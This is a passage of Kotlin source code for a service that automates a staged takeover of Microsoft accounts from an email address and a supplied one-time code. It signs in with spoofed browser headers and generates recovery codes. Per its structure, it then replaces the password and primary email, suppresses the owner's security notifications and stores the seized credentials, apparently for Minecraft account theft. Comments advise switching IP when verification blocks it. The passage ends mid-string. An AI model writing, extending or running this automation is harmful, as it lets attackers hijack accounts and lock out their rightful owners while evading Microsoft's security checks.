package microsoft.recovery

import database.model.RecoveredAccount
import database.repository.AccountRepository
import io.ktor.client.HttpClient
import io.ktor.client.call.body
import io.ktor.client.engine.HttpClientEngine
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.HttpRedirect
import io.ktor.client.plugins.cookies.AcceptAllCookiesStorage
import io.ktor.client.plugins.cookies.CookiesStorage
import io.ktor.client.plugins.cookies.HttpCookies
import io.ktor.client.request.forms.submitForm
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.parameter
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.client.statement.request
import io.ktor.http.ContentType
import io.ktor.http.Cookie
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.http.URLBuilder
import io.ktor.http.Url
import io.ktor.http.contentType
import io.ktor.http.isSuccess
import io.ktor.http.parameters
import io.ktor.http.parseServerSetCookieHeader
import io.ktor.http.takeFrom
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.ensureActive
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import microsoft.recovery.alias.AliasClient
import microsoft.recovery.alias.SessionExpiredException
import microsoft.recovery.model.GenerateRecoveryCodeRequest
import microsoft.recovery.model.GenerateRecoveryCodeResponse
import microsoft.recovery.model.GenericCanaryResponse
import microsoft.recovery.model.GetCredentialTypeRequest
import microsoft.recovery.model.GetCredentialTypeResponse
import microsoft.recovery.model.GetOneTimeCodeResponse
import microsoft.recovery.model.MakePrimaryRequest
import microsoft.recovery.model.ManageProofsData
import microsoft.recovery.model.NotificationProofDetail
import microsoft.recovery.model.ProofItem
import microsoft.recovery.model.RecoverUserRequest
import microsoft.recovery.model.RecoverUserResponse
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import microsoft.recovery.model.SecurityCleanupRequest
import microsoft.recovery.model.SetUserNotificationStateRequest
import microsoft.recovery.model.VerifyRecoveryCodeRequest
import microsoft.recovery.model.VerifyRecoveryCodeResponse
import microsoft.recovery.util.MicrosoftHttpClientFactory
import microsoft.recovery.util.RecoveryParsers
import org.jsoup.Jsoup
import org.slf4j.LoggerFactory
import java.security.SecureRandom
import kotlin.time.Duration.Companion.milliseconds

typealias StageListener = suspend (stageKey: String, stageName: String, isSuccess: Boolean, detail: String) -> Unit

class RecoveryService(
    private val clientEngine: HttpClientEngine? = null,
    private val stageDelayMs: Long = 1000L,
    private val accountRepository: AccountRepository? = null,
    private val aliasClient: AliasClient? = null,
    private val stopAfterStage7: Boolean = false,
) : AutoCloseable {

    private val logger = LoggerFactory.getLogger(RecoveryService::class.java)
    private val secureRandom = SecureRandom()

    override fun close() {
    }

    suspend fun runLifecycle(
        email: String,
        otpProvider: suspend () -> String,
        newPassword: String? = null,
        newEmail: String? = null,
        stageListener: StageListener? = null,
        aliasOtcProvider: (suspend (String) -> String)? = null,
    ): RecoveryResult {
        if (email.isBlank()) {
            return RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Email cannot be blank")
        }

        val trimmedEmail = email.trim()
        val targetPassword = newPassword
            ?.let(RecoveryParsers::sanitizePassword)
            ?.takeIf { it.isNotBlank() }
            ?: run {
                val length = secureRandom.nextInt(5) + 12
                RecoveryParsers.generateRandomPassword(length)
            }

        val effectiveNewEmail = newEmail?.trim()?.takeIf { it.isNotEmpty() }
            ?: aliasClient?.generateAliasFromEmail(trimmedEmail)
            ?: "recov_${RecoveryParsers.generateUaid().take(8)}@outlook.com"

        val cookieStorage = AcceptAllCookiesStorage()
        val client = if (clientEngine != null) {
            MicrosoftHttpClientFactory.create(storage = cookieStorage, engine = clientEngine)
        } else {
            MicrosoftHttpClientFactory.create(storage = cookieStorage)
        }

        return try {
            executeLifecycle(
                client = client,
                cookieStorage = cookieStorage,
                email = trimmedEmail,
                otpProvider = otpProvider,
                newPassword = targetPassword,
                newEmail = effectiveNewEmail,
                stageListener = stageListener,
                aliasOtcProvider = aliasOtcProvider,
            )
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            logger.error("Unhandled exception during lifecycle automation: {}", e.message, e)
            val msg = if (e.message?.contains("Max send count", ignoreCase = true) == true) {
                "Network timeout or Microsoft rate limit hit: ${e.message}"
            } else {
                "Lifecycle failed with unexpected exception: ${e.message}"
            }
            RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = msg,
                cause = e,
            )
        } finally {
            client.close()
        }
    }

    private suspend fun executeLifecycle(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        email: String,
        otpProvider: suspend () -> String,
        newPassword: String,
        newEmail: String,
        stageListener: StageListener? = null,
        aliasOtcProvider: (suspend (String) -> String)? = null,
    ): RecoveryResult {
        var uaid = RecoveryParsers.generateUaid()

        val stage1Result = executeStage1(client, email, stageListener)
        if (stage1Result is StageExecution.Failure) return stage1Result.result
        val (initialPpft, proofId, proofChannel) = (stage1Result as StageExecution.Success).value

        val stage2Result = executeStage2(client, email, initialPpft, proofId, proofChannel, stageListener)
        if (stage2Result is StageExecution.Failure) return stage2Result.result
        val postPpft = (stage2Result as StageExecution.Success).value

        val otp = otpProvider().trim()
        val stage2bResult = executeStage2b(client, cookieStorage, email, proofId, postPpft, otp, stageListener)
        if (stage2bResult is StageExecution.Failure) return stage2bResult.result

        val storedUaid = cookieStorage.get(Url("https://login.live.com")).firstOrNull { it.name == "uaid" }?.value
        if (!storedUaid.isNullOrBlank()) {
            uaid = storedUaid
        }

        val stage3Result = executeStage3(client, cookieStorage, uaid, stageListener)
        if (stage3Result is StageExecution.Failure) return stage3Result.result

        val postStage3Uaid = cookieStorage.get(Url("https://account.live.com")).firstOrNull { it.name == "uaid" }?.value
            ?: cookieStorage.get(Url("https://login.live.com")).firstOrNull { it.name == "uaid" }?.value
        if (!postStage3Uaid.isNullOrBlank()) {
            uaid = postStage3Uaid
        }

        val stage4Result = executeStage4(client, stageListener)
        if (stage4Result is StageExecution.Failure) return stage4Result.result
        val proofsData = (stage4Result as StageExecution.Success).value
        var activeCanary = proofsData.apiCanary
        val encryptedNetId = proofsData.encryptedNetId

        val stage5Result = executeStage5(client, encryptedNetId, activeCanary, stageListener)
        if (stage5Result is StageExecution.Failure) return stage5Result.result
        val (initialRecoveryCode, canaryAfter5) = (stage5Result as StageExecution.Success).value
        activeCanary = canaryAfter5

        val stage6Result = executeStage6(
            client = client,
            email = email,
            newPassword = newPassword,
            newEmail = newEmail,
            initialRecoveryCode = initialRecoveryCode,
            canary = activeCanary,
            stageListener = stageListener,
        )
        if (stage6Result is StageExecution.Failure) return stage6Result.result
        val (finalRecoveryCode, canaryAfter6) = (stage6Result as StageExecution.Success).value
        activeCanary = canaryAfter6

        if (stageDelayMs > 0) delay(stageDelayMs)

        val freshProofsResponse = client.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val freshProofsData = RecoveryParsers.extractManageProofsData(freshProofsResponse.bodyAsText(), MicrosoftHttpClientFactory.json)
        val emailProofs = freshProofsData?.emailProofs ?: proofsData.emailProofs
        val smsProofs = freshProofsData?.smsProofs ?: proofsData.smsProofs
        val passKeyIds = freshProofsData?.passKeyIds ?: proofsData.passKeyIds
        if (!freshProofsData?.apiCanary.isNullOrBlank()) {
            activeCanary = freshProofsData.apiCanary
        }

        val stage7Result = executeStage7(client, uaid, emailProofs, smsProofs, activeCanary, stageListener)
        if (stage7Result is StageExecution.Failure) return stage7Result.result
        val (suppressedCount, canaryAfter7) = (stage7Result as StageExecution.Success).value
        activeCanary = canaryAfter7

        val targetAliasEmail: String
        if (stopAfterStage7) {
            logger.info("Debug mode: stopping after Stage 7 and marking {} as SUCCESS", email)
            targetAliasEmail = email
        } else {
            if (stageDelayMs > 0) delay(stageDelayMs)

            val stage8Result = executeStage8(
                client = client,
                cookieStorage = cookieStorage,
                email = email,
                newEmail = newEmail,
                uaid = uaid,
                canary = activeCanary,
                stageListener = stageListener,
                aliasOtcProvider = aliasOtcProvider,
            )
            if (stage8Result is StageExecution.Failure) return stage8Result.result
            val (rotatedAliasEmail, canaryAfter8) = (stage8Result as StageExecution.Success).value
            targetAliasEmail = rotatedAliasEmail
            activeCanary = canaryAfter8

            if (stageDelayMs > 0) delay(stageDelayMs)

            executeStage9(client, uaid, passKeyIds, activeCanary, stageListener)
        }

        accountRepository?.let { repo ->
            try {
                repo.saveAccount(
                    RecoveredAccount(
                        originalEmail = email,
                        currentPrimaryEmail = targetAliasEmail,
                        password = newPassword,
                        recoveryCode = finalRecoveryCode,
                        ownsMinecraft = false,
                        status = RecoveredAccount.STATUS_SUCCESS,
                    ),
                )
            } catch (err: Exception) {
                if (err is CancellationException) throw err
                logger.error("Failed to save recovered account for {}: {}", email, err.message, err)
            }
        }

        return RecoveryResult.Success(
            originalEmail = email,
            newPrimaryEmail = targetAliasEmail,
            password = newPassword,
            initialRecoveryCode = initialRecoveryCode,
            finalRecoveryCode = finalRecoveryCode,
            suppressedProofsCount = suppressedCount,
        )
    }

    private suspend fun executeStage1(
        client: HttpClient,
        email: String,
        stageListener: StageListener?,
    ): StageExecution<Triple<String, String, String>> = try {
        val loginResponse = client.get("https://login.live.com/login.srf")
        if (!loginResponse.status.isSuccess()) {
            val msg = "Failed to fetch login page: HTTP ${loginResponse.status.value}"
            stageListener?.invoke("1", "Credential Discovery", false, msg)
            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
        } else {
            val loginHtml = loginResponse.bodyAsText()
            val initialPpft = RecoveryParsers.extractPpft(loginHtml, MicrosoftHttpClientFactory.json)
            if (initialPpft == null) {
                val msg = "Failed to extract initial PPFT from login page"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
            } else {
                val credResponse = client.post("https://login.live.com/GetCredentialType.srf") {
                    contentType(ContentType.Application.Json)
                    header("Referer", "https://login.live.com/login.srf")
                    setBody(
                        GetCredentialTypeRequest(
                            username = email,
                            flowToken = initialPpft,
                            isUcuxLoginForm = true,
                            isCookieBannerShown = false,
                            checkPhones = true,
                        )
                    )
                }

                if (!credResponse.status.isSuccess()) {
                    val msg = "Credential check failed: HTTP ${credResponse.status.value}"
                    stageListener?.invoke("1", "Credential Discovery", false, msg)
                    StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
                } else {
                    val credData = credResponse.body<GetCredentialTypeResponse>()
                    when (credData.ifExistsResult) {
                        0 -> {
                            val proofs = credData.credentials?.otcLoginEligibleProofs.orEmpty()
                            val primaryProof = proofs.firstOrNull()
                            if (primaryProof?.data == null) {
                                val msg = if (primaryProof == null) {
                                    "No OTC eligible proofs available for this account"
                                } else {
                                    "Primary proof identifier is missing"
                                }
                                stageListener?.invoke("1", "Credential Discovery", false, msg)
                                StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
                            } else {
                                stageListener?.invoke("1", "Credential Discovery", true, "IfExistsResult = 0")
                                val proofChannel = if (primaryProof.type == 2) "SMS" else "Email"
                                StageExecution.Success(Triple(initialPpft, primaryProof.data, proofChannel))
                            }
                        }
                        1 -> {
                            val msg = "Account does not exist (IfExistsResult=1)"
                            stageListener?.invoke("1", "Credential Discovery", false, msg)
                            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, "1"))
                        }
                        5 -> {
                            val msg = "Account is throttled or captcha blocked (IfExistsResult=5)"
                            stageListener?.invoke("1", "Credential Discovery", false, msg)
                            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, "5"))
                        }
                        else -> {
                            val msg = "Unexpected IfExistsResult=${credData.ifExistsResult}"
                            stageListener?.invoke("1", "Credential Discovery", false, msg)
                            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, credData.ifExistsResult?.toString()))
                        }
                    }
                }
            }
        }
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Network timeout or Microsoft rate limit hit: ${e.message}"
        stageListener?.invoke("1", "Credential Discovery", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, cause = e))
    }

    private suspend fun executeStage2(
        client: HttpClient,
        email: String,
        initialPpft: String,
        proofId: String,
        proofChannel: String,
        stageListener: StageListener?,
    ): StageExecution<String> = try {
        val otcResponse = client.submitForm(
            url = "https://login.live.com/GetOneTimeCode.srf",
            formParameters = parameters {
                append("login", email)
                append("flowtoken", initialPpft)
                append("purpose", "eOTT_OtcLogin")
                append("channel", proofChannel)
                append("AltEmailE", proofId)
            },
        )

        val rawBody = otcResponse.bodyAsText()
        val jsonResponse = runCatching {
            MicrosoftHttpClientFactory.json.parseToJsonElement(rawBody).jsonObject
        }.getOrNull()

        val state = jsonResponse?.get("State")?.jsonPrimitive?.intOrNull
            ?: jsonResponse?.get("state")?.jsonPrimitive?.intOrNull
        val flowToken = jsonResponse?.get("FlowToken")?.jsonPrimitive?.contentOrNull
            ?: jsonResponse?.get("flowToken")?.jsonPrimitive?.contentOrNull

        if (flowToken.isNullOrEmpty()) {
            val msg = "Fatal: Missing FlowToken in response"
            stageListener?.invoke("2", "OTP Dispatch", false, msg)
            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.OTP_DISPATCH, msg, state?.toString()))
        } else {
            if (state != 204 && state != null) {
                logger.warn("Microsoft returned State $state (Rate Limited). Proceeding with FlowToken.")
            }

            stageListener?.invoke("2", "OTP Dispatch", true, "FlowToken received")
            StageExecution.Success(flowToken)
        }
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Network timeout or Microsoft rate limit hit: ${e.message}"
        stageListener?.invoke("2", "OTP Dispatch", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.OTP_DISPATCH, msg, cause = e))
    }

    private suspend fun executeStage2b(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        email: String,
        proofId: String,
        postPpft: String,
        otp: String,
        stageListener: StageListener?,
    ): StageExecution<Unit> = try {
        if (otp.isBlank()) {
            val msg = "Provided OTP code is blank"
            stageListener?.invoke("2b", "OTP Submit", false, msg)
            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_ESTABLISHMENT, msg))
        } else {
            val postResponse = client.submitForm(
                url = "https://login.live.com/ppsecure/post.srf",
                formParameters = parameters {
                    append("login", email)
                    append("loginfmt", email)
                    append("type", "27")
                    append("SentProofIDE", proofId)
                    append("otc", otp)
                    append("PPFT", postPpft)
                    append("LoginOptions", "3")
                },
            )

            val loginCookies = cookieStorage.get(Url("https://login.live.com"))
            val msaAuthCookie = loginCookies.firstOrNull { it.name == "__Host-MSAAUTH" }
                ?: postResponse.headers.getAll(HttpHeaders.SetCookie)?.firstOrNull { it.contains("__Host-MSAAUTH") }?.let {
                    val value = it.substringAfter("__Host-MSAAUTH=").substringBefore(";")
                    Cookie(name = "__Host-MSAAUTH", value = value, domain = "login.live.com", path = "/", secure = true)
                }

            if (msaAuthCookie == null) {
                val msg = "Failed to establish authenticated session: __Host-MSAAUTH cookie not found"
                stageListener?.invoke("2b", "OTP Submit", false, msg)
                StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_ESTABLISHMENT, msg))
            } else {
                cookieStorage.addCookie(
                    Url("https://login.live.com"),
                    Cookie(name = "__Host-MSAAUTH", value = msaAuthCookie.value, domain = "login.live.com", path = "/", secure = true),
                )

                stageListener?.invoke("2b", "OTP Submit", true, "__Host-MSAAUTH received")
                StageExecution.Success(Unit)
            }
        }
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Network timeout or Microsoft rate limit hit: ${e.message}"
        stageListener?.invoke("2b", "OTP Submit", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_ESTABLISHMENT, msg, cause = e))
    }

    private suspend fun executeStage3(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        uaid: String,
        stageListener: StageListener?,
    ): StageExecution<Unit> = try {
        val loginCookies = cookieStorage.get(Url("https://login.live.com"))
        val currentUaid = loginCookies.firstOrNull { it.name == "uaid" }?.value ?: uaid
        val msaAuthValue = loginCookies.firstOrNull { it.name == "__Host-MSAAUTH" }?.value
        val amscValue = loginCookies.firstOrNull { it.name == "amsc" }?.value

        if (msaAuthValue.isNullOrBlank()) {
            val msg = "Missing __Host-MSAAUTH cookie for session stabilization"
            stageListener?.invoke("3", "Session Polish", false, msg)
            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
        } else {
            val cleanCookieHeader = "__Host-MSAAUTH=$msaAuthValue; uaid=$currentUaid"
            val stabilizationUrl = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=$currentUaid&lc=1033&id=38936&mkt=en-US"

            val isolatedClient = if (clientEngine != null) {
                HttpClient(clientEngine) {
                    followRedirects = true
                    install(HttpRedirect) { checkHttpMethod = false }
                }
            } else {
                HttpClient(OkHttp.create()) {
                    followRedirects = true
                    install(HttpRedirect) { checkHttpMethod = false }
                }
            }

            val polishResponse = isolatedClient.use { clientInstance ->
                clientInstance.get(stabilizationUrl) {
                    header(HttpHeaders.Cookie, cleanCookieHeader)
                    header(HttpHeaders.UserAgent, MicrosoftHttpClientFactory.DEFAULT_USER_AGENT)
                    header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
                    header(
                        HttpHeaders.Accept,
                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    )
                    header("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"")
                    header("Sec-Ch-Ua-Mobile", "?0")
                    header("Sec-Ch-Ua-Platform", "\"Windows\"")
                    header("Sec-Fetch-Dest", "document")
                    header("Sec-Fetch-Mode", "navigate")
                    header("Sec-Fetch-Site", "same-site")
                    header("Sec-Fetch-User", "?1")
                    header("Upgrade-Insecure-Requests", "1")
                }
            }

            for (rawHeader in polishResponse.headers.getAll(HttpHeaders.SetCookie).orEmpty()) {
                val parsed = runCatching { parseServerSetCookieHeader(rawHeader) }.getOrNull()
                if (parsed != null && parsed.name.isNotBlank()) {
                    val targetDomain = parsed.domain ?: "login.live.com"
                    val targetUrl = Url(if (targetDomain.contains("account.live.com")) "https://account.live.com" else "https://login.live.com")
                    cookieStorage.addCookie(
                        targetUrl,
                        parsed.copy(domain = targetDomain, path = parsed.path ?: "/"),
                    )
                }
            }

            val initialUrl = polishResponse.request.url.toString().ifBlank { stabilizationUrl }
            val responseBodyString = polishResponse.bodyAsText()
            val parsedDoc = Jsoup.parse(responseBodyString, initialUrl)
            val htmlTitle = parsedDoc.title()
            val hasPpftInitial = responseBodyString.contains("name=\"PPFT\"")
            val htmlSnippet = responseBodyString.take(500).replace("\r", "").replace("\n", " ")

            logger.info("=== STAGE 3 DEBUG ===")
            logger.info("HTTP Status: {}", polishResponse.status)
            logger.info("Location Header: {}", polishResponse.headers[HttpHeaders.Location] ?: "none")
            logger.info("HTML Length: {}", responseBodyString.length)
            logger.info("HTML Title: {}", htmlTitle)
            if (hasPpftInitial) {
                logger.warn("CRITICAL: Response contains PPFT. Microsoft is asking to log in again.")
            }
            logger.info("HTML Snippet: {}", htmlSnippet)

            val debugLogDetail = """
Status: `${polishResponse.status}` | Title: `$htmlTitle` | Length: `${responseBodyString.length}`
Location: `${polishResponse.headers[HttpHeaders.Location] ?: "none"}` | PPFT: `$hasPpftInitial`
```html
$htmlSnippet
```
""".trimIndent()
            stageListener?.invoke("3-debug", "Stage 3 Debug Dump", true, debugLogDetail)

            var currentHtml = responseBodyString
            var currentUrl = initialUrl
            var currentDoc = parsedDoc
            var submittedAddProofViaForm = false
            var hops = 0

            while (hops < 2) {
                val hasDoSubmit = currentHtml.contains("DoSubmit()", ignoreCase = true) ||
                    currentDoc.selectFirst("body[onload*=DoSubmit]") != null
                val autoSubmitForm = if (hasDoSubmit) {
                    currentDoc.selectFirst("form[name=fmHF], form#fmHF, form")
                } else {
                    null
                }
                val actionUrl = autoSubmitForm?.absUrl("action")?.ifBlank { autoSubmitForm.attr("action").trim() }.orEmpty()
                val hiddenFields = autoSubmitForm?.select("input[type=hidden]")
                    ?.mapNotNull { input ->
                        val name = input.attr("name").trim()
                        if (name.isNotEmpty()) name to input.attr("value") else null
                    }
                    .orEmpty()

                if (!hasDoSubmit ||
                    actionUrl.isBlank() ||
                    (!actionUrl.startsWith("https://") && !actionUrl.startsWith("http://")) ||
                    hiddenFields.isEmpty()
                ) {
                    break
                }

                hops++
                logger.info(
                    "Stage 3 detected DoSubmit() auto-submit form (hop={}): action={}, fieldNames={}",
                    hops,
                    actionUrl,
                    hiddenFields.joinToString(",") { it.first },
                )

                if (actionUrl.contains("/proofs/Add", ignoreCase = true)) {
                    val addProofResponse = submitStage3AddProofForm(actionUrl, hiddenFields, cookieStorage)
                    if (captureStage3AccountCookies(addProofResponse, cookieStorage)) {
                        submittedAddProofViaForm = true
                        break
                    }
                    currentHtml = addProofResponse.bodyAsText()
                    currentUrl = actionUrl
                    currentDoc = Jsoup.parse(currentHtml, currentUrl)
                } else {
                    val intermediateResponse = submitStage3IntermediateForm(actionUrl, hiddenFields, cleanCookieHeader)
                    if (captureStage3AccountCookies(intermediateResponse, cookieStorage)) {
                        submittedAddProofViaForm = true
                        break
                    }
                    currentHtml = intermediateResponse.bodyAsText()
                    currentUrl = intermediateResponse.request.url.toString().ifBlank { actionUrl }
                    currentDoc = Jsoup.parse(currentHtml, currentUrl)
                }
            }

            if (submittedAddProofViaForm) {
                stageListener?.invoke("3", "Session Polish", true, "AMRPSSecAuth received")
                StageExecution.Success(Unit)
            } else {
                val hasPpft = currentHtml.contains("name=\"PPFT\"")
                var tokenT = currentDoc.selectFirst("input[name=t]")?.attr("value")
                if (tokenT.isNullOrEmpty()) {
                    val match = Regex("""name=["']t["']\s+value=["']([^"']+)["']""").find(currentHtml)
                        ?: Regex("""value=["']([^"']+)["']\s+name=["']t["']""").find(currentHtml)
                        ?: Regex("""["']t["']\s*:\s*["']([^"']+)["']""").find(currentHtml)
                    tokenT = match?.groupValues?.get(1)
                }

                if (tokenT.isNullOrBlank()) {
                    val bodyText = currentDoc.body().text()
                    logger.error("Stage 3 Failed. Microsoft Interstitial Text: {}", bodyText.take(500))

                    if (bodyText.contains("Protect", ignoreCase = true) || bodyText.contains("Verify", ignoreCase = true)) {
                        val msg = "Microsoft requested additional identity verification (Captcha/2FA). Try again later or use a different IP."
                        stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail\nText: ${bodyText.take(300)}")
                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
                    } else if (hasPpft) {
                        val msg = "Session expired or invalid, asked to login again."
                        stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail")
                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
                    } else {
                        val msg = "Token t not found in HTML."
                        stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail\nText: ${bodyText.take(300)}")
                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
                    }
                } else {
                    val addProofResponse = submitStage3AddProofForm(
                        actionUrl = "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
                        formFields = listOf("t" to tokenT),
                        cookieStorage = cookieStorage,
                    )

                    if (!captureStage3AccountCookies(addProofResponse, cookieStorage)) {
                        val msg = "Missing AMRPSSecAuth or amsc cookies after session stabilization"
                        stageListener?.invoke("3", "Session Polish", false, msg)
                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
                    } else {
                        stageListener?.invoke("3", "Session Polish", true, "AMRPSSecAuth received")
                        StageExecution.Success(Unit)
                    }
                }
            }
        }
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Network timeout or Microsoft rate limit hit: ${e.message}"
        stageListener?.invoke("3", "Session Polish", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg, cause = e))
    }

    private suspend fun submitStage3AddProofForm(
        actionUrl: String,
        formFields: List<Pair<String, String>>,
        cookieStorage: CookiesStorage,
    ): io.ktor.client.statement.HttpResponse {
        val noRedirectPostClient = if (clientEngine != null) {
            HttpClient(clientEngine) {
                followRedirects = false
            }
        } else {
            HttpClient(OkHttp.create()) {
                followRedirects = false
            }
        }

        return noRedirectPostClient.use {
            val response = it.submitForm(
                url = actionUrl,
                formParameters = parameters {
                    for ((key, value) in formFields) {
                        append(key, value)
                    }
                },
            ) {
                header(HttpHeaders.UserAgent, MicrosoftHttpClientFactory.DEFAULT_USER_AGENT)
                header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
            }
            logger.info(
                "Stage 3 POST /proofs/Add status={}, location={}",
                response.status,
                response.headers[HttpHeaders.Location] ?: "none",
            )
            response
        }
    }

    private suspend fun submitStage3IntermediateForm(
        actionUrl: String,
        formFields: List<Pair<String, String>>,
        cleanCookieHeader: String,
    ): io.ktor.client.statement.HttpResponse {
        val intermediateClient = if (clientEngine != null) {
            HttpClient(clientEngine) {
                followRedirects = true
                install(HttpRedirect) { checkHttpMethod = false }
            }
        } else {
            HttpClient(OkHttp.create()) {
                followRedirects = true
                install(HttpRedirect) { checkHttpMethod = false }
            }
        }

        return intermediateClient.use {
            val response = it.submitForm(
                url = actionUrl,
                formParameters = parameters {
                    for ((key, value) in formFields) {
                        append(key, value)
                    }
                },
            ) {
                header(HttpHeaders.Cookie, cleanCookieHeader)
                header(HttpHeaders.UserAgent, MicrosoftHttpClientFactory.DEFAULT_USER_AGENT)
                header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
            }
            logger.info(
                "Stage 3 POST intermediate status={}, location={}",
                response.status,
                response.headers[HttpHeaders.Location] ?: "none",
            )
            response
        }
    }

    private suspend fun captureStage3AccountCookies(
        response: io.ktor.client.statement.HttpResponse,
        cookieStorage: CookiesStorage,
    ): Boolean {
        val existingAccountCookies = cookieStorage.get(Url("https://account.live.com"))
        val setCookieHeaders = response.headers.getAll(HttpHeaders.SetCookie).orEmpty()
        for (rawCookie in setCookieHeaders) {
            if (rawCookie.contains("AMRPSSecAuth=") && existingAccountCookies.none { it.name == "AMRPSSecAuth" }) {
                val value = rawCookie.substringAfter("AMRPSSecAuth=").substringBefore(";")
                cookieStorage.addCookie(
                    Url("https://account.live.com"),
                    Cookie(name = "AMRPSSecAuth", value = value, domain = "account.live.com", path = "/", secure = true),
                )
            }
            if (rawCookie.contains("amsc=") && existingAccountCookies.none { it.name == "amsc" }) {
                val value = rawCookie.substringAfter("amsc=").substringBefore(";")
                cookieStorage.addCookie(
                    Url("https://account.live.com"),
                    Cookie(name = "amsc", value = value, domain = "account.live.com", path = "/", secure = true),
                )
            }
        }

        val accountCookies = cookieStorage.get(Url("https://account.live.com"))
        val hasAmrp = accountCookies.any { it.name == "AMRPSSecAuth" } ||
            setCookieHeaders.any { it.contains("AMRPSSecAuth") }
        val hasAmsc = accountCookies.any { it.name == "amsc" } ||
            setCookieHeaders.any { it.contains("amsc") }
        return hasAmrp && hasAmsc
    }

    private suspend fun executeStage4(
        client: HttpClient,
        stageListener: StageListener?,
    ): StageExecution<ManageProofsData> = try {
        val manageProofsResponse = client.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val finalUrl = manageProofsResponse.request.url.toString()
        val manageProofsHtml = manageProofsResponse.bodyAsText()
        val parsedDoc = Jsoup.parse(manageProofsHtml)
        val htmlTitle = parsedDoc.title()
        val hasT0 = manageProofsHtml.contains("t0")
        val hasManageProofs = manageProofsHtml.contains("manageProofs")
        val hasServerData = manageProofsHtml.contains("ServerData")
        val hasEncryptedNetId = manageProofsHtml.contains("encryptedNetId")
        val hasApiCanary = manageProofsHtml.contains("apiCanary")
        val hasPpft = manageProofsHtml.contains("PPFT")

        logger.info(
            "Stage 4 response: status={}, url={}, title={}, length={}, hasT0={}, hasManageProofs={}, hasServerData={}, hasEncryptedNetId={}, hasApiCanary={}, hasPpft={}",
            manageProofsResponse.status,
            finalUrl,
            htmlTitle,
            manageProofsHtml.length,
            hasT0,
            hasManageProofs,
            hasServerData,
            hasEncryptedNetId,
            hasApiCanary,
            hasPpft,
        )

        val proofsData = RecoveryParsers.extractManageProofsData(manageProofsHtml, MicrosoftHttpClientFactory.json)
        if (proofsData == null) {
            val htmlSnippet = manageProofsHtml.take(500).replace("\r", "").replace("\n", " ")
            val bodyText = parsedDoc.body().text().take(300)
            val debugDetail = """
Status: `${manageProofsResponse.status}` | Title: `$htmlTitle` | Length: `${manageProofsHtml.length}`
URL: `$finalUrl` | Location: `${manageProofsResponse.headers[HttpHeaders.Location] ?: "none"}`
Keys: t0=`$hasT0`, manageProofs=`$hasManageProofs`, ServerData=`$hasServerData`, encryptedNetId=`$hasEncryptedNetId`, apiCanary=`$hasApiCanary`, PPFT=`$hasPpft`
```html
$htmlSnippet
```
Text: $bodyText
